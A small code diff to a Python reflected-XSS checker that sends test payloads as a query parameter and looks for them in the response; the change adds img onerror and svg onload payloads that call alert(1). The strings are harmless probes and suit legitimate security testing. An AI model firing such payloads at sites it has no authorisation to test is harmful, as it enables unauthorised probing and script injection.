@@ -1,7 +1,9 @@
 import requests
 
 def check_xss(url):
-  payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>']
+  payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>',
+              '<img src=x onerror=alert(1)>', '"><img src=x onerror=alert(1)>',
+              '<svg/onload=alert(1)>', '"><svg/onload=alert(1)>']
   for payload in payloads:
     r = requests.get(url, params={'q': payload})
     if payload in r.text:
